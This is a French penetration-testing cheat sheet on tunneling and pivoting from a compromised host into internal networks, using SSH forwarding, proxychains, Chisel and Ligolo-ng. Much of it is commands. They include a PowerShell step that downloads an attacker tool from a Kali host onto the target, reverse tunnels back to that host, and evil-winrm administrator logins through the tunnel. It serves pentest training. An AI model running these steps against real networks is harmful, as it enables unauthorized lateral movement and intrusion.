# 12 — Tunneling & Pivot

> Objectif : accéder à des réseaux internes depuis un hôte compromis.

---

## Contexte

```
[Kali] → [Machine compromise] → [Réseau interne inaccessible]
                ↑
           Point de pivot
```

---

## SSH — port forwarding

### Local port forwarding — accéder à un service interne

```bash
# Accéder au port 80 interne via localhost:8080
ssh -L 8080:192.168.1.10:80 user@[IP_PIVOT]

# Puis dans le navigateur ou curl
curl http://localhost:8080
```

### Remote port forwarding — exposer un service vers l'extérieur

```bash
# Exposer le port 80 de la cible interne sur le port 9090 de Kali
ssh -R 9090:192.168.1.10:80 user@[IP_KALI]
```

### Tunnel dynamique SOCKS — router tout le trafic

```bash
# Créer un tunnel SOCKS5 sur le port 1080
ssh -D 1080 user@[IP_PIVOT]

# Configurer proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Utiliser proxychains pour toutes les commandes
proxychains nmap -sT 192.168.1.0/24
proxychains curl http://192.168.1.10
```

---

## Chisel — tunnel TCP/UDP sans SSH

### Sur Kali (serveur)

```bash
# Télécharger chisel
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gunzip chisel_linux_amd64.gz && mv chisel_linux_amd64 chisel && chmod +x chisel

# Lancer le serveur
./chisel server -p 8000 --reverse
```

### Sur la cible (client)

```powershell
# Télécharger chisel Windows
Invoke-WebRequest -Uri http://[IP_KALI]:8080/chisel.exe -OutFile C:\Temp\chisel.exe

# Connexion reverse SOCKS
.\chisel.exe client [IP_KALI]:8000 R:socks
```

### Sur Kali — utiliser le tunnel

```bash
# Proxychains sur le port SOCKS ouvert par chisel (1080 par défaut)
proxychains nmap -sT 192.168.1.0/24
proxychains evil-winrm -i 192.168.1.10 -u Administrator -p [password]
```

---

## Ligolo-ng — pivot avancé (plus propre que proxychains)

### Sur Kali (proxy)

```bash
# Télécharger ligolo-ng
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/proxy-linux-amd64
chmod +x proxy-linux-amd64

# Créer l'interface tun
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Lancer le proxy
./proxy-linux-amd64 -selfcert -laddr 0.0.0.0:11601
```

### Sur la cible (agent)

```powershell
# Windows
.\agent.exe -connect [IP_KALI]:11601 -ignore-cert

# Linux
./agent-linux-amd64 -connect [IP_KALI]:11601 -ignore-cert
```

### Sur Kali — activer le tunnel

```bash
# Dans la console ligolo
session          # sélectionner la session
start            # démarrer le tunnel

# Ajouter la route vers le réseau interne
sudo ip route add 192.168.1.0/24 dev ligolo

# Maintenant accès direct sans proxychains
nmap 192.168.1.0/24
curl http://192.168.1.10
```

---

## Proxychains — configuration rapide

```bash
# Éditer la config
nano /etc/proxychains4.conf

# Ajouter en bas du fichier
socks5 127.0.0.1 1080    # pour SSH -D ou chisel

# Utilisation
proxychains [commande]
proxychains nmap -sT -p 80,443,22 192.168.1.10
proxychains curl http://192.168.1.10
proxychains evil-winrm -i 192.168.1.10 -u admin -p password
```

---

## Référence rapide

| Besoin | Outil |
|---|---|
| Accès à 1 port interne | `ssh -L` |
| Router tout le trafic (simple) | `ssh -D` + proxychains |
| Pas de SSH sur la cible | Chisel |
| Pivot propre sans proxychains | Ligolo-ng |
